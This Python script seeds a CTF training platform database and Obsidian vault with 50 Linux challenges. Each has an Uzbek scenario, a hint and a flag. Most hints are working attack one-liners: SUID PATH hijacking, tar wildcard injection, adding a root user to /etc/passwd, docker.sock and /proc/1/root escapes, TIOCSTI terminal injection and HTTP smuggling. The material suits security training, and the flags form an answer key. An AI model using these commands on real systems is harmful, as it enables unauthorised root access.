import sqlite3
import os
from pathlib import Path

BASE_DIR = Path("/app" if os.path.exists("/app") else "/home/fara/.gemini/antigravity/scratch/telegram_video_bot")
DB_PATH = BASE_DIR / "ctf_platform.db"
VAULT_DIR = Path("/app/ctf_vault" if os.path.exists("/app") else "/home/fara/.gemini/antigravity/scratch/ctf_vault")
VAULT_DIR.mkdir(parents=True, exist_ok=True)

CHALLENGES_50 = [
    # ==================== TRACK 1: MEMORY FORENSICS & /PROC (1-10) ====================
    (
        "Modul 1: Memory & /proc Forensics",
        "CH01: Unlinked Secret in /proc/fd",
        "Hard", 8,
        "Tizimda fonda ishlayotgan 'audit_daemon' maxfiy 'audit_key.token' faylini xotiraga yuklab, darhol diskdan o'chirib yuborgan (unlink). /proc fayl deskriptorlari orqali o'chirilgan faylni RAM dan tiklang.",
        "ps aux | grep audit_daemon orqali PID ni toping, so'ng /proc/<PID>/fd/ katalogidagi (deleted) yozuvli deskriptorni o'qing: cat /proc/<PID>/fd/<NUM>",
        "HD{proc_fd_unlinked_memory_recovery_901}",
        ["proc", "file-descriptors", "memory-forensics", "unlinked"]
    ),
    (
        "Modul 1: Memory & /proc Forensics",
        "CH02: Null-Byte Process Environ Injection",
        "Hard", 7,
        "Yashirin ishlayotgan 'vault_watcher' jarayonining muhit o'zgaruvchilari (environ) ichida maxfiy parol va flag qoldirilgan. Process xotirasidagi null-bayt bilan ajratilgan o'zgaruvchilarni filtrlash orqali flagni oling.",
        "cat /proc/<PID>/environ | tr '\\0' '\\n' | grep 'SECRET_FLAG'",
        "HD{environ_null_byte_process_inspection_902}",
        ["environ", "proc", "null-bytes", "reverse"]
    ),
    (
        "Modul 1: Memory & /proc Forensics",
        "CH03: Core Dump Extraction in /dev/shm",
        "Hard", 8,
        "/dev/shm xotira katalogida to'satdan qulagan (crashed) server jarayonining core dump fayli ('core.dump.bin') qolgan. Undan xotira torlari va Base64 qatlamlarini ajratib, maxfiy kalitni tiklang.",
        "strings /dev/shm/core.dump.bin | grep -E '^([A-Za-z0-9+/]{4})*([A-Za-z0-9+/]{3}=|[A-Za-z0-9+/]{2}==)?$' | base64 -d",
        "HD{core_dump_memory_shm_carver_903}",
        ["coredump", "shm", "strings", "forensics"]
    ),
    (
        "Modul 1: Memory & /proc Forensics",
        "CH04: Intercepting SIGUSR1 Signals",
        "Hard", 8,
        "/tmp/signal_emitter demoni har 2 soniyada o'ziga SIGUSR1 signali yuborilganda navbatdagi flag baytini stdout ga uzatadi. Bash trap yoki signal ushlagich orqali 5 ta signal yuborib to'liq flagni yig'ing.",
        "for i in {1..5}; do kill -USR1 <PID>; sleep 0.2; done",
        "HD{linux_signal_trap_interceptor_904}",
        ["signals", "sigusr1", "trap", "processes"]
    ),
    (
        "Modul 1: Memory & /proc Forensics",
        "CH05: GDB Process Memory Inspection",
        "Hard", 9,
        "Fonda pauza qilingan (stopped state 'T') jarayon /tmp/crypto_agent xotirasida AES kalitini saqlab turibdi. GDB yordamida jarayonga ulanib (attach), heap xotirasidan flagni o'qing.",
        "gdb -p <PID> -batch -ex 'x/s 0x555555558000' yoki 'dump memory /tmp/mem.dump 0x555555558000 0x555555559000'",
        "HD{gdb_process_heap_inspection_master_905}",
        ["gdb", "heap", "reverse", "debugging"]
    ),
    (
        "Modul 1: Memory & /proc Forensics",
        "CH06: Shared Memory IPC Carving (ipcs -m)",
        "Hard", 8,
        "Tizimda `shmget` orqali yaratilgan maxfiy Shared Memory segmenti (Key: 0x1337) mavjud. `ipcs` va C/Python yordamida ushbu xotira blokiga ulanib, flagni o'qing.",
        "ipcs -m orqali shmid ni toping, so'ng python sysv_ipc yoki C shmat() orqali segmentdan o'qing.",
        "HD{sysv_shared_memory_segment_carver_906}",
        ["shm", "ipcs", "ipc", "memory"]
    ),
    (
        "Modul 1: Memory & /proc Forensics",
        "CH07: LD_PRELOAD Stealth Hook Detection",
        "Hard", 9,
        "Tizimda '/etc/ld.so.preload' orqali yashirin rootkit o'rnatilgan bo'lib, u 'ls' va 'ps' buyruqlaridan maxfiy fayllarni yashirmoqda. Boshqa tizim chaqiruvlari (syscalls) orqali yashirilgan faylni toping.",
        "LD_PRELOAD='' /bin/ls -la yoki strace /bin/ls /tmp orqali preload hookni chetlab o'ting.",
        "HD{ld_preload_stealth_rootkit_bypass_907}",
        ["ld_preload", "rootkit", "evasion", "hooks"]
    ),
    (
        "Modul 1: Memory & /proc Forensics",
        "CH08: Cgroups CPU Throttling Evasion",
        "Hard", 8,
        "Sizning sessiyangiz /sys/fs/cgroup/cpu chekloviga tushgan va murakkab hisob-kitob dasturlari kill qilinmoqda. Cheklovni aylanib o'tish uchun optimallashtirilgan I/O konveyer skriptini yozing.",
        "CPU yuklamasini kamaytirish uchun disk buffer va 'nice -n -20' parametrlaridan foydalaning.",
        "HD{cgroups_quota_evasion_bypass_908}",
        ["cgroups", "kernel", "limits", "performance"]
    ),
    (
        "Modul 1: Memory & /proc Forensics",
        "CH09: Inode Recovery from Raw Ext4 Superblock",
        "Hard", 10,
        "/tmp/vault_partition.img faylida ext4 tizimi shikastlangan. Inode jadvalini `debugfs` yoki `fls/icat` orqali tahlil qilib, 1337-inodeda saqlangan o'chirilgan faylni tiklang.",
        "debugfs -R 'cat <1337>' /tmp/vault_partition.img",
        "HD{ext4_inode_raw_superblock_recovery_909}",
        ["ext4", "debugfs", "inodes", "forensics"]
    ),
    (
        "Modul 1: Memory & /proc Forensics",
        "CH10: Mount Namespace Escape via /proc/1/root",
        "Hard", 10,
        "Siz chroot va unshare namespace ichidasiz. Lekin /proc katalogi to'liq ajratilmagan. /proc/1/root orqali asosiy xost tizimining /root/root_flag.txt fayliga kiring.",
        "cat /proc/1/root/root/root_flag.txt",
        "HD{namespace_mount_proc_escape_master_910}",
        ["namespace", "chroot", "proc-escape", "privesc"]
    ),

    # ==================== TRACK 2: PRIVILEGE ESCALATION & SUID / CAPABILITIES (11-20) ====================
    (
        "Modul 2: PrivEsc & Binary Exploitation",
        "CH11: SUID Relative Path Hijacking",
        "Hard", 8,
        "/usr/local/bin/system_catalog SUID binary ichida '/bin/cat' o'rniga shunchaki 'cat' buyrug'ini chaqiradi. PATH Hijacking orqali root imtiyozida ixtiyoriy buyruq bajaring.",
        "echo -e '#!/bin/sh\\ncat /root/flag.txt' > cat && chmod +x cat && export PATH=.:$PATH && /usr/local/bin/system_catalog",
        "HD{suid_relative_path_hijack_root_911}",
        ["suid", "path-hijacking", "privesc", "root"]
    ),
    (
        "Modul 2: PrivEsc & Binary Exploitation",
        "CH12: Linux Capabilities cap_dac_read_search",
        "Hard", 8,
        "/opt/audit/log_reader binar fayli 'cap_dac_read_search+ep' qobiliyatiga ega. Ushbu ruxsat fayl tizimidagi istalgan ruxsatsiz fayllarni o'qish imkonini beradi. /etc/shadow va /root/flag.txt ni o'qing.",
        "/opt/audit/log_reader /root/flag.txt",
        "HD{cap_dac_read_search_arbitrary_read_912}",
        ["capabilities", "cap_dac_read", "privesc", "shadow"]
    ),
    (
        "Modul 2: PrivEsc & Binary Exploitation",
        "CH13: Sudoers Wildcard Injection in Tar",
        "Hard", 9,
        "Sizga 'sudo /bin/tar -czf /tmp/backup.tar.gz *' buyrug'ini parolsiz bajarish ruxsati berilgan. Wildcard injection orqali root huquqida shell oching.",
        "echo 'echo HD{tar_wildcard_sudo_injection_root_913} > /tmp/flag' > run.sh && touch -- '--checkpoint=1' && touch -- '--checkpoint-action=exec=sh run.sh' && sudo tar -czf /tmp/backup.tar.gz *",
        "HD{tar_wildcard_sudo_injection_root_913}",
        ["sudo", "wildcard", "tar", "privesc"]
    ),
    (
        "Modul 2: PrivEsc & Binary Exploitation",
        "CH14: Python SUID Module Hijacking",
        "Hard", 8,
        "Root nomidan ishlovchi SUID python skripti '/opt/scripts/status.py' ichida 'import hashlib' qiladi. Python qidiruv yo'lidagi (sys.path) ustunlikdan foydalanib 'hashlib.py' ni o'zgartiring.",
        "echo 'import os; os.system(\"cat /root/flag.txt\")' > hashlib.py && /opt/scripts/status.py",
        "HD{python_module_import_hijacking_root_914}",
        ["python", "module-hijacking", "suid", "privesc"]
    ),
    (
        "Modul 2: PrivEsc & Binary Exploitation",
        "CH15: Writable /etc/ld.so.conf.d/ Shared Lib Injection",
        "Hard", 9,
        "/etc/ld.so.conf.d/ papkasi yozish uchun ochiq (777). Yangi kutubxona yo'lini kiritib, 'ldconfig' orqali SUID binar chaqiradigan '.so' faylni almashtiring.",
        "echo '/tmp/lib' > /etc/ld.so.conf.d/pwn.conf && gcc -shared -fPIC -o /tmp/lib/libtarget.so pwn.c && ldconfig",
        "HD{shared_library_ld_config_injection_915}",
        ["shared-lib", "ldconfig", "privesc", "c"]
    ),
    (
        "Modul 2: PrivEsc & Binary Exploitation",
        "CH16: Format String Flag Leak in SUID Binary",
        "Hard", 9,
        "/opt/bin/reporter binar fayli 'printf(argv[1])' zaifligiga ega. Format string parametrlari (%x, %s, %p) orqali stekda saqlangan maxfiy flag manzilini o'qing.",
        "/opt/bin/reporter '%p.%p.%p.%p.%s'",
        "HD{format_string_stack_leak_exploit_916}",
        ["format-string", "binary-exploitation", "stack", "pwn"]
    ),
    (
        "Modul 2: PrivEsc & Binary Exploitation",
        "CH17: Writable /etc/passwd Root Ingestion",
        "Hard", 7,
        "/etc/passwd fayli ruxsatida xatolik tufayli hamma uchun yozishga ruxsat bor (rw-rw-rw-). Yangi 0-UID li root foydalanuvchisini qo'shing.",
        "openssl passwd -1 -salt pwn pwnpass -> 'hacker:$1$pwn$...:0:0:root:/root:/bin/bash' ni /etc/passwd ga qo'shing.",
        "HD{passwd_writable_root_insertion_master_917}",
        ["passwd", "misconfig", "root-account", "privesc"]
    ),
    (
        "Modul 2: PrivEsc & Binary Exploitation",
        "CH18: Linux Capability cap_setuid Binary Abuse",
        "Hard", 8,
        "/usr/bin/python3.14 ga 'cap_setuid+ep' berilgan. Python 'os.setuid(0)' chaqiruvi orqali to'liq root imtiyozini qo'lga kiriting.",
        "python3 -c 'import os; os.setuid(0); os.system(\"cat /root/flag.txt\")'",
        "HD{cap_setuid_python_escalation_918}",
        ["capabilities", "python", "root", "privesc"]
    ),
    (
        "Modul 2: PrivEsc & Binary Exploitation",
        "CH19: Sudo Vim NOPASSWD Shell Escape",
        "Medium", 5,
        "Sizda 'sudo vim /var/log/syslog' buyrug'ini parolsiz bajarish ruxsati bor. Vim ichki qobig'i (shell escape) orqali root flagini oling.",
        "sudo vim -c ':!/bin/sh'",
        "HD{vim_sudoers_shell_escape_master_919}",
        ["vim", "sudoers", "gtfobins", "privesc"]
    ),
    (
        "Modul 2: PrivEsc & Binary Exploitation",
        "CH20: TOCTOU Symlink Race Condition in Root Script",
        "Hard", 10,
        "Root cron skripti '/tmp/stage/log.tmp' faylini tekshirib, 0.1 soniyadan keyin unga ma'lumot yozadi. Inotify va symlink poygasi (Race condition) orqali '/root/flag.txt' ni o'zgartiring yoki o'qing.",
        "while true; do ln -sf /root/flag.txt /tmp/stage/log.tmp; ln -sf /tmp/dummy /tmp/stage/log.tmp; done",
        "HD{toctou_symlink_race_condition_root_920}",
        ["toctou", "race-condition", "symlinks", "privesc"]
    ),

    # ==================== TRACK 3: ADVANCED STREAMS, SOCKETS & COVERT CHANNELS (21-30) ====================
    (
        "Modul 3: Streams, FIFO & Sockets",
        "CH21: Multi-stage Named Pipe (FIFO) Handshake",
        "Hard", 8,
        "/tmp/req_pipe va /tmp/res_pipe kanallarida autentifikatsiya protokoli ishlamoqda. 3 bosqichli SHA256 challenge-response so'roviga to'g'ri javob qaytaring.",
        "exec 3<>/tmp/req_pipe; exec 4<>/tmp/res_pipe; read -u 3 token; echo -n $token | sha256sum >&4",
        "HD{named_pipe_fifo_multistage_handshake_921}",
        ["fifo", "named-pipes", "file-descriptors", "ipc"]
    ),
    (
        "Modul 3: Streams, FIFO & Sockets",
        "CH22: Pure Bash Raw /dev/tcp Packet Crafting",
        "Hard", 7,
        "Tizimda curl, wget va netcat mavjud emas. Faqat bash ichki /dev/tcp/127.0.0.1/8080 orqali HTTP POST so'rovini yasab, 'Auth: CyberRelay' headeri bilan yuboring.",
        "exec 3<>/dev/tcp/127.0.0.1/8080; echo -e 'GET /flag HTTP/1.1\\r\\nHost: 127.0.0.1\\r\\nAuth: CyberRelay\\r\\n\\r\\n' >&3; cat <&3",
        "HD{pure_bash_dev_tcp_packet_crafting_922}",
        ["dev-tcp", "bash-sockets", "http", "networking"]
    ),
    (
        "Modul 3: Streams, FIFO & Sockets",
        "CH23: Unix Domain Socket Protocol Fuzzing",
        "Hard", 8,
        "/run/auth_vault.sock Unix Domain Socketi orqali binar protokol o'tmoqda. `socat` yoki `nc -U` yordamida 'GET_TOKEN_V2' binar paketini jo'natib flagni oling.",
        "echo -e '\\x01\\x00\\x08GET_TOKEN_V2' | nc -U /run/auth_vault.sock",
        "HD{unix_domain_socket_binary_fuzzer_923}",
        ["unix-sockets", "socat", "ipc", "reverse"]
    ),
    (
        "Modul 3: Streams, FIFO & Sockets",
        "CH24: Rolling XOR Hex Stream Decryptor",
        "Hard", 9,
        "127.0.0.1:9001 portida har soniyada aylanma (rolling) XOR kaliti bilan shifrlangan hex oqimi uzatilmoqda. Konveyer orqali har bir baytni 0x5A bilan XOR qilib flagni o'qing.",
        "nc 127.0.0.1 9001 | xxd -r -p | python3 -c 'import sys; [sys.stdout.write(chr(b ^ 0x5A)) for b in sys.stdin.buffer.read()]'",
        "HD{rolling_xor_hex_socket_stream_decryptor_924}",
        ["xor", "sockets", "hex", "crypto"]
    ),
    (
        "Modul 3: Streams, FIFO & Sockets",
        "CH25: ICMP Covert Channel Packet Capture",
        "Hard", 8,
        "Lokal interfeysda har 5 soniyada ICMP (Ping) paketlarining Data bo'limida maxfiy flag qismlari yashirin yuborilmoqda. `tcpdump` yordamida paketlarni ushlab flagni tiklang.",
        "tcpdump -i lo -nnvv -X icmp -c 10",
        "HD{icmp_ping_covert_channel_exfiltration_925}",
        ["tcpdump", "icmp", "covert-channel", "pcap"]
    ),
    (
        "Modul 3: Streams, FIFO & Sockets",
        "CH26: Bidirectional Pipeline with Subshells",
        "Hard", 8,
        "Dastur faqat stdin va stderr orqali interaktiv ishlaydi. Stdout ni /dev/null ga yo'naltirib, stderr dagi xatolik kodlarini filtrlash orqali flagni oling.",
        "./validator 2>&1 >/dev/null | grep 'FLAG_PART'",
        "HD{bidirectional_stderr_redirection_pipeline_926}",
        ["redirection", "stderr", "stdout", "descriptors"]
    ),
    (
        "Modul 3: Streams, FIFO & Sockets",
        "CH27: Netcat Port Knocking Sequence",
        "Hard", 9,
        "Xavfsizlik devori 1337-portni yopib qo'ygan. Unga ulanish uchun ketma-ket 7000, 8000, 9000 portlariga TCP paket yuborib (Port Knocking), 1337-portdagi flagni oching.",
        "for p in 7000 8000 9000; do nc -z -w1 127.0.0.1 $p; done; nc 127.0.0.1 1337",
        "HD{port_knocking_firewall_sequence_bypass_927}",
        ["port-knocking", "firewall", "iptables", "netcat"]
    ),
    (
        "Modul 3: Streams, FIFO & Sockets",
        "CH28: HTTP Chunked Transfer Smuggling",
        "Hard", 9,
        "Lokal reverse proxy va backend orasida Transfer-Encoding: chunked parsing zaifligi mavjud. Soxta chunked paket orqali ichki /admin/flag API endpointini chaqiring.",
        "printf 'POST / HTTP/1.1\\r\\nHost: localhost\\r\\nTransfer-Encoding: chunked\\r\\n\\r\\n0\\r\\n\\r\\nGET /admin/flag HTTP/1.1\\r\\n\\r\\n' | nc 127.0.0.1 80",
        "HD{http_chunked_smuggling_proxy_bypass_928}",
        ["http", "smuggling", "proxy", "web-security"]
    ),
    (
        "Modul 3: Streams, FIFO & Sockets",
        "CH29: WebSocket Binary Frame Parser",
        "Hard", 8,
        "127.0.0.1:8088 da WebSocket server binar maskalangan frame larni yuborayapti. Python yoki wscat orqali 4-baytlik unmasking kalitini yeching.",
        "python3 -c 'import asyncio, websockets; ...'",
        "HD{websocket_binary_frame_unmasking_master_929}",
        ["websocket", "binary-protocol", "masking", "streams"]
    ),
    (
        "Modul 3: Streams, FIFO & Sockets",
        "CH30: Custom Linux Pseudo-Terminal (PTY) Hijacking",
        "Hard", 10,
        "/dev/pts/3 terminalida boshqa foydalanuvchi buyruq kiritmoqda. `TIOCSTI` ioctl injection orqali uning terminaliga buyruq yuborib, flagni o'z papkangizga nusxalang.",
        "python3 -c 'import fcntl, termios; [fcntl.ioctl(open(\"/dev/pts/3\",\"w\"), termios.TIOCSTI, c) for c in \"cat /root/flag.txt > /tmp/flag\\n\"]'",
        "HD{pty_tiocsti_terminal_injection_root_930}",
        ["pty", "ioctl", "tiocsti", "terminal-hijack"]
    ),

    # ==================== TRACK 4: LOG FORENSICS, AWK, REGEX & CARVING (31-40) ====================
    (
        "Modul 4: Log Forensics & Filters",
        "CH31: Multi-GB Web Log AWK State Machine",
        "Hard", 8,
        "/var/log/traffic/access.log (1.5 GB) ichida bir xil User-Agent bilan 3 ta turli xil IP dan SQL Injection payload yuborgan hujumchi IP larini AWK state machine bilan toping.",
        "awk -F'\"' '{print $6}' /var/log/traffic/access.log | sort | uniq -c | sort -nr",
        "HD{awk_state_machine_multigb_log_forensics_931}",
        ["awk", "log-analysis", "sqli", "forensics"]
    ),
    (
        "Modul 4: Log Forensics & Filters",
        "CH32: Sed Multi-line Pattern Space Decode",
        "Hard", 7,
        "Maxfiy ma'lumot faylida flag bir nechta qatorlarga bo'lingan va har bir juft qatordan keyin shifrlangan bayt joylashgan. `sed -n 'N; ...'` yordamida flagni tiklang.",
        "sed -n 'N;s/\\n//;p' /tmp/split_flag.txt | tr -d ' '",
        "HD{sed_multiline_pattern_space_decoder_932}",
        ["sed", "pattern-space", "regex", "filters"]
    ),
    (
        "Modul 4: Log Forensics & Filters",
        "CH33: Steganography in Tar Header Checksums",
        "Hard", 9,
        "/tmp/archive.tar faylidagi har bir fayl sarlavhasining (Header Checksum) 8-baytlik maydoniga maxfiy xabar bitlari yashirilgan. Hexdump orqali sarlavhalarni tahlil qiling.",
        "hexdump -C /tmp/archive.tar | grep -B1 '00000000'",
        "HD{tar_header_checksum_steganography_933}",
        ["tar", "steganography", "hexdump", "forensics"]
    ),
    (
        "Modul 4: Log Forensics & Filters",
        "CH34: Auditd Linux Kernel Event Forensics",
        "Hard", 8,
        "/var/log/audit/audit.log ichida root huquqida bajarilgan va syscall=59 (execve) chaqirgan barcha binar fayllarni ajratib, o'chirilgan binar nomini toping.",
        "ausearch -sc execve -i | grep 'comm=' | sort | uniq",
        "HD{auditd_kernel_event_execve_forensics_934}",
        ["auditd", "kernel-events", "execve", "syscalls"]
    ),
    (
        "Modul 4: Log Forensics & Filters",
        "CH35: SSH auth.log Brute-Force Password Anomaly",
        "Hard", 8,
        "SSH audit logida (/var/log/auth.log) 100,000 ta kirish urinishlari orasidan yagona 'Accepted password' ga erishgan muvaffaqiyatli sessiyani toping.",
        "grep 'Accepted password' /var/log/auth.log",
        "HD{ssh_auth_log_compromised_session_hunter_935}",
        ["auth-log", "ssh", "bruteforce", "triage"]
    ),
    (
        "Modul 4: Log Forensics & Filters",
        "CH36: 100-Layer Recursive Archive Matryoshka",
        "Hard", 8,
        "Fayl 100 qatlamli turli xil arxivlar (.tar.gz, .bz2, .xz, .zip, .7z) bilan siqilgan. Avtomatlashtirilgan bash script yozib, eng ichki qatlamdagi flagni chiqaring.",
        "while true; do 7z x archive.* -y || tar -xf archive.* || unzip archive.* || break; done",
        "HD{recursive_archive_matryoshka_unpacker_936}",
        ["archive", "matryoshka", "bash-script", "automation"]
    ),
    (
        "Modul 4: Log Forensics & Filters",
        "CH37: Base58, Base85 & Rot13 Multi-Layer Carving",
        "Hard", 7,
        "Fayldagi ma'lumot avval Rot13, keyin Base58, so'ng Base85 bilan shifrlangan. Bitta quvur liniyasi (One-liner) orqali barcha qatlamlarni yeching.",
        "cat payload.enc | tr 'A-Za-z' 'N-ZA-Mn-za-m' | python3 -c 'import base58, base64, sys; ...'",
        "HD{multilayer_base58_rot13_pipeline_carver_937}",
        ["base58", "rot13", "base85", "crypto"]
    ),
    (
        "Modul 4: Log Forensics & Filters",
        "CH38: PCAP Dump SMB File Stream Extraction",
        "Hard", 9,
        "/tmp/capture.pcap faylida SMB2 protokoli orqali uzatilgan fayl oqimi saqlangan. `tshark` yordamida uzatilgan faylni to'liq ajratib oling.",
        "tshark -r /tmp/capture.pcap --export-objects smb,/tmp/extracted/",
        "HD{tshark_pcap_smb_file_carver_master_938}",
        ["pcap", "tshark", "smb", "packet-analysis"]
    ),
    (
        "Modul 4: Log Forensics & Filters",
        "CH39: 1,000,000 JSON Logs JQ Arithmetic Filter",
        "Hard", 8,
        "/var/log/cloud_events.json ichida 1 millionta JSON hodisa mavjud. `response_time > 4500` va `status == 500` bo'lgan, `user_id` juft son bo'lgan barcha yozuvlarni toping.",
        "jq -r '.[] | select(.response_time > 4500 and .status == 500 and .user_id % 2 == 0) | .flag' /var/log/cloud_events.json",
        "HD{jq_json_million_log_arithmetic_filter_939}",
        ["jq", "json", "big-data", "filters"]
    ),
    (
        "Modul 4: Log Forensics & Filters",
        "CH40: Time-based Correlation of wtmp & btmp Logs",
        "Hard", 8,
        "/var/log/btmp va /var/log/wtmp binar loglarini `utmpdump` orqali taqqoslab, tizim o'chirilishidan roppa-rosa 3 soniya oldin kirgan foydalanuvchini aniqlang.",
        "utmpdump /var/log/wtmp | grep 'reboot' -B2",
        "HD{utmpdump_wtmp_btmp_timeline_correlation_940}",
        ["utmpdump", "wtmp", "btmp", "timeline"]
    ),

    # ==================== TRACK 5: AUTOMATION, CRON, SYSTEMD & KERNEL TRIAGE (41-50) ====================
    (
        "Modul 5: Automation, Systemd & Kernel",
        "CH41: Systemd Service Unit Persistence Hijacking",
        "Hard", 9,
        "/etc/systemd/system/maintenance.service fayli yozish ruxsatiga ega. 'ExecStartPre' direktivasini kiritib, tizim servisini qayta yuklash orqali root flagini oling.",
        "echo 'ExecStartPre=/bin/sh -c \"cat /root/flag.txt > /tmp/flag\"' >> /etc/systemd/system/maintenance.service",
        "HD{systemd_unit_persistence_execstart_root_941}",
        ["systemd", "persistence", "services", "privesc"]
    ),
    (
        "Modul 5: Automation, Systemd & Kernel",
        "CH42: Tar --to-command Script Injection in Backup",
        "Hard", 9,
        "Avtomatlashtirilgan root skripti 'tar --to-command=/tmp/hook.sh -xf /backup/update.tar' ni bajaradi. /tmp/hook.sh ni yaratib root imtiyozini qo'lga kiriting.",
        "echo -e '#!/bin/sh\\ncat /root/flag.txt > /tmp/flag\\nchmod 777 /tmp/flag' > /tmp/hook.sh && chmod +x /tmp/hook.sh",
        "HD{tar_to_command_injection_root_exploit_942}",
        ["tar", "to-command", "backup", "privesc"]
    ),
    (
        "Modul 5: Automation, Systemd & Kernel",
        "CH43: Rsync Daemon Writable Share Privilege Escalation",
        "Hard", 8,
        "Lokal 873-portda rsync demony `auth users` talab qilmaydigan 'root_fs' modulini ochib qo'ygan. `rsync` orqali /etc/cron.d/ ga yangi cronjob yuklang.",
        "rsync -av /tmp/my_cron rsync://127.0.0.1/root_fs/etc/cron.d/pwn",
        "HD{rsync_unauthenticated_share_cron_injection_943}",
        ["rsync", "cron", "privesc", "networking"]
    ),
    (
        "Modul 5: Automation, Systemd & Kernel",
        "CH44: Kernel dmesg Ring Buffer Memory Carving",
        "Hard", 8,
        "Yadro moduli (Kernel Module) yuklanish chog'ida xatolik yuz berib, maxfiy flagni dmesg xotira buferiga tashlab ketgan. `dmesg` orqali xotira stack trace ni o'qing.",
        "dmesg | grep -A5 'MODULE_CRASH_DUMP'",
        "HD{kernel_dmesg_ring_buffer_stack_trace_944}",
        ["dmesg", "kernel-module", "ring-buffer", "triage"]
    ),
    (
        "Modul 5: Automation, Systemd & Kernel",
        "CH45: Logrotate Race Condition Root Backdoor",
        "Hard", 10,
        "/etc/logrotate.d/nginx konfiguratsiyasi 'create 0644 root root' qoidasiga ega va 'prerotate' da foydalanuvchi papkasidagi faylni ko'chiradi. Logrotate race condition orqali root bo'ling.",
        "logrotten poygasi orqali /etc/passwd ni almashtiring.",
        "HD{logrotate_race_condition_root_exploit_945}",
        ["logrotate", "race-condition", "privesc", "logrotten"]
    ),
    (
        "Modul 5: Automation, Systemd & Kernel",
        "CH46: Modprobe.d Protocol Handler Injection",
        "Hard", 9,
        "/etc/modprobe.d/custom.conf fayli orqali mavjud bo'lmagan tarmoq protokoli 'install net-pf-31 /tmp/pwn.sh' ga yo'naltirilgan. Socket chaqiruvi orqali modprobe ni ishga tushiring.",
        "python3 -c 'import socket; socket.socket(31, socket.SOCK_RAW, 0)'",
        "HD{modprobe_protocol_handler_kernel_hook_946}",
        ["modprobe", "kernel-hooks", "socket", "privesc"]
    ),
    (
        "Modul 5: Automation, Systemd & Kernel",
        "CH47: Docker.sock Escape Host Root Filesystem Mount",
        "Hard", 9,
        "Sizning konteyneringizga `/var/run/docker.sock` ulab berilgan. Docker CLI orqali asosiy xost operatsion tizimining ildiz katalogini (`/`) yangi konteynerga mount qiling.",
        "docker run -v /:/host -it alpine chroot /host cat /root/flag.txt",
        "HD{docker_sock_container_breakout_root_mount_947}",
        ["docker", "container-escape", "docker-sock", "privesc"]
    ),
    (
        "Modul 5: Automation, Systemd & Kernel",
        "CH48: PAM Authentication Module Backdoor Analysis",
        "Hard", 8,
        "/etc/pam.d/common-auth faylida kiber-hujumchi tomonidan 'pam_permit.so' yoki maxfiy master-parol moduli joylashtirilgan. PAM konfiguratsiyasini tahlil qilib universal parolni toping.",
        "grep -rn 'pam_exec' /etc/pam.d/ yoki /etc/security/",
        "HD{pam_authentication_module_backdoor_hunter_948}",
        ["pam", "authentication", "backdoor", "security"]
    ),
    (
        "Modul 5: Automation, Systemd & Kernel",
        "CH49: SUID Shell /bin/sh -p Effective UID Preservation",
        "Hard", 8,
        "Dastur `/bin/sh` ni chaqiradi, lekin bash real UID va effective UID teng bo'lmaganda imtiyozni tashlab yuboradi. `-p` (privileged mode) parametrini kiritib haqiqiy root bo'ling.",
        "/opt/tools/launcher -p",
        "HD{suid_bin_sh_privileged_mode_euid_949}",
        ["suid", "bash-p", "euid", "privesc"]
    ),
    (
        "Modul 5: Automation, Systemd & Kernel",
        "CH50: FINAL BOSS: Multi-Stage Chain CTF",
        "Hard", 15,
        "Oxirgi Katta Topshiriq: 1-bosqichda tarmoq portidan XOR kalitni oling ➡️ 2-bosqichda `/proc` xotirasidan o'chirilgan faylni tiklang ➡️ 3-bosqichda SUID Path Hijacking orqali root bo'lib yakuniy flagni oling!",
        "1. nc 127.0.0.1 9999 -> 2. cat /proc/<PID>/fd/X -> 3. SUID ./backup_service",
        "HD{cyber_ultimate_grandmaster_chained_exploit_950}",
        ["final-boss", "chained-exploit", "full-compromise", "master"]
    )
]

def populate_database_and_vault():
    conn = sqlite3.connect(DB_PATH)
    cursor = conn.cursor()
    cursor.execute("DELETE FROM challenges;")
    
    for idx, chal in enumerate(CHALLENGES_50, 1):
        module, title, diff, pts, desc, hint, flag, tags = chal
        
        # 1. Insert into Database
        cursor.execute("""
        INSERT INTO challenges (id, module, title, difficulty, points, description, hint, flag)
        VALUES (?, ?, ?, ?, ?, ?, ?, ?)
        """, (idx, module, title, diff, pts, desc, hint, flag))
        
        # 2. Generate Obsidian Markdown File
        safe_title = title.lower().replace(' ', '_').replace('/', '_').replace('(', '').replace(')', '').replace(':', '')
        md_file = VAULT_DIR / f"{idx:02d}_{safe_title}.md"
        
        md_content = f"""---
id: {idx}
title: "{title}"
module: "{module}"
difficulty: {diff}
points: {pts}
tags: {tags}
flag: "{flag}"
---

# 🎯 Topshiriq #{idx}: {title}

## 📌 Metama'lumotlar:
* **Modul:** `{module}`
* **Qiyinlik darajasi:** `🔴 {diff}`
* **Maksimal Ball:** `⭐ {pts} ball`
* **Teglar:** {', '.join([f'#{t}' for t in tags])}

---

## 📝 Topshiriq Senariysi (Scenario):
{desc}

---

## 💡 Kichik Maslahat (Hint):
> [!TIP]
> {hint}

---

## 🛠️ Professional Yechim Ko'rsatmasi:
```bash
# Topshiriqni yechish bo'yicha ko'rsatma:
{hint}
```

---

## 🚩 Maxfiy Flag:
`{flag}`
"""
        with open(md_file, "w", encoding="utf-8") as f:
            f.write(md_content)

    conn.commit()
    conn.close()
    print(f"🎉 50 TA HARD-LEVEL CTF TOPSHIRIQLARI DATABASE VA OBSIDIAN VAULTGA ({VAULT_DIR}) 100% YUKLANDI!")

if __name__ == "__main__":
    populate_database_and_vault()
